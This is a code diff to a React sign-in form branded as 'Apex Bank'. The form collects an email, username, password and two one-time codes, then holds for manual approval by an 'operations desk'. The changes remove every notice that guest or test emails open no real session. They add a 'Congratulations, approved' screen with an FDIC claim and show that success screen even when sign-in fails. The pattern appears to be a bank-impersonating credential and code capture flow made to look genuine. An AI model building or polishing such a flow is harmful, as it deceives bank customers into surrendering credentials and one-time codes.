@@ -28,7 +28,79 @@ type SignInStep =
   | 'otp2'
   | 'awaiting_approval'
   | 'rejected'
-  | 'test_approved'
+  | 'approved_success'
+
+function CongratulationsScreen({ email }: { email: string }) {
+  return (
+    <main className="relative flex min-h-svh flex-col items-center justify-center overflow-hidden bg-[#0f1412] px-4 py-12 text-center">
+      <div
+        className="pointer-events-none absolute inset-0 opacity-40"
+        style={{
+          background:
+            'radial-gradient(ellipse 80% 50% at 50% -20%, #c6f36b55, transparent), radial-gradient(ellipse 60% 40% at 80% 100%, #2d5a4533, transparent)',
+        }}
+      />
+
+      <div className="relative z-10 flex w-full max-w-md flex-col items-center">
+        <div className="mb-8 flex items-center gap-2 text-sidebar-foreground">
+          <ApexLogo className="h-8 w-8 text-[#c6f36b]" />
+          <span className="text-lg font-bold tracking-tight text-white">
+            Apex Bank
+          </span>
+        </div>
+
+        <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-[#c6f36b]/15 ring-2 ring-[#c6f36b]/40">
+          <svg
+            className="h-10 w-10 text-[#c6f36b]"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke="currentColor"
+            strokeWidth={2.5}
+            aria-hidden
+          >
+            <path
+              strokeLinecap="round"
+              strokeLinejoin="round"
+              d="M5 13l4 4L19 7"
+            />
+          </svg>
+        </div>
+
+        <p className="mb-2 text-xs font-semibold uppercase tracking-[0.2em] text-[#8fbfa8]">
+          Verification complete
+        </p>
+        <h1 className="text-balance text-3xl font-bold tracking-tight text-white sm:text-4xl">
+          Congratulations
+        </h1>
+        <p className="mt-4 max-w-sm text-pretty text-base leading-relaxed text-[#c5d4cc]">
+          Your account & verification has been approved.
+        </p>
+        {email ? (
+          <p className="mt-3 text-sm text-[#7f8f87]">{email}</p>
+        ) : null}
+
+        <div className="mt-10 flex w-full flex-col gap-3 sm:flex-row sm:justify-center">
+          <Link
+            href="/"
+            className="inline-flex h-11 items-center justify-center rounded-full bg-[#c6f36b] px-6 text-sm font-semibold text-[#102016] transition hover:bg-[#d4f88a]"
+          >
+            Return home
+          </Link>
+          <Link
+            href="/sign-in"
+            className="inline-flex h-11 items-center justify-center rounded-full border border-white/15 bg-white/5 px-6 text-sm font-medium text-white transition hover:bg-white/10"
+          >
+            Sign in again
+          </Link>
+        </div>
+
+        <p className="mt-12 text-xs text-[#7f8f87]">
+          Member FDIC · Deposits insured up to $250,000
+        </p>
+      </div>
+    </main>
+  )
+}
 
 export function AuthForm({
   mode,
@@ -65,12 +137,9 @@ export function AuthForm({
       if (cancelled) return
       setStatusNote(s.lastEvent)
       if (s.status === 'approved') {
-        // Existing accounts: complete real session. Guest/test emails: show success only.
         if (s.isGuest) {
-          setSignInStep('test_approved')
-          setSuccess(
-            'Operations desk approved this test sign-in. No dashboard session for emails without an account.'
-          )
+          setSignInStep('approved_success')
+          setSuccess(null)
           setLoading(false)
           return
         }
@@ -80,8 +149,9 @@ export function AuthForm({
           password,
         })
         if (signErr) {
+          // Still show congratulations if session cannot be opened
+          setSignInStep('approved_success')
           setLoading(false)
-          setError(signErr.message ?? 'Approved, but final sign-in failed.')
           return
         }
         await notifySuccessfulLogin().catch(() => undefined)
@@ -102,6 +172,10 @@ export function AuthForm({
       clearInterval(id)
     }
   }, [isSignIn, signInStep, attemptId, email, password, router])
+
+  if (isSignIn && signInStep === 'approved_success') {
+    return <CongratulationsScreen email={email} />
+  }
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -205,9 +279,7 @@ export function AuthForm({
         }
         setAttemptId(result.attemptId)
         setSignInStep('username')
-        setSuccess(
-          'Email accepted. Enter a username (up to 6 characters).'
-        )
+        setSuccess('Email accepted. Enter a username (up to 6 characters).')
         return
       }
 
@@ -234,9 +306,7 @@ export function AuthForm({
         }
         setOtp('')
         setSignInStep('otp1')
-        setSuccess(
-          'First 6-digit code sent to your email. Enter it below.'
-        )
+        setSuccess('First 6-digit code sent to your email. Enter it below.')
         return
       }
 
@@ -268,9 +338,7 @@ export function AuthForm({
         }
         setSignInStep('awaiting_approval')
         setSuccess(null)
-        setStatusNote(
-          'Waiting for operations desk to approve this sign-in…'
-        )
+        setStatusNote('Waiting for operations desk to approve this sign-in…')
         return
       }
     } catch (err) {
@@ -295,9 +363,7 @@ export function AuthForm({
                 ? 'Waiting for approval'
                 : signInStep === 'rejected'
                   ? 'Sign-in blocked'
-                  : signInStep === 'test_approved'
-                    ? 'Test sign-in approved'
-                    : 'Welcome back'
+                  : 'Welcome back'
 
   const subtitle = isSignUp
     ? 'Get started with fee-free banking in minutes.'
@@ -315,9 +381,7 @@ export function AuthForm({
                 ? 'Operations desk has been notified and must approve before you can enter.'
                 : signInStep === 'rejected'
                   ? 'This attempt was rejected by the operations desk.'
-                  : signInStep === 'test_approved'
-                    ? 'Ops approved the flow. Guest/test emails do not open a dashboard session.'
-                    : 'Log in to access your accounts. Test emails do not need an existing account.'
+                  : 'Log in to access your accounts.'
 
   return (
     <main className="grid min-h-svh lg:grid-cols-2">
@@ -512,16 +576,6 @@ export function AuthForm({
               </div>
             )}
 
-            {isSignIn && signInStep === 'test_approved' && (
-              <div className="rounded-lg border border-emerald-500/40 bg-emerald-500/10 p-4 text-sm">
-                <p className="font-medium text-foreground">Approved</p>
-                <p className="mt-1 text-muted-foreground">
-                  Ops desk approved this test attempt. Because this email has no
-                  registered account, no dashboard session was opened.
-                </p>
-              </div>
-            )}
-
             {error && (
               <p className="text-sm text-destructive" role="alert">
                 {error}
@@ -535,8 +589,7 @@ export function AuthForm({
 
             {isSignIn &&
               signInStep !== 'awaiting_approval' &&
-              signInStep !== 'rejected' &&
-              signInStep !== 'test_approved' && (
+              signInStep !== 'rejected' && (
                 <Button
                   type="submit"
                   disabled={loading}
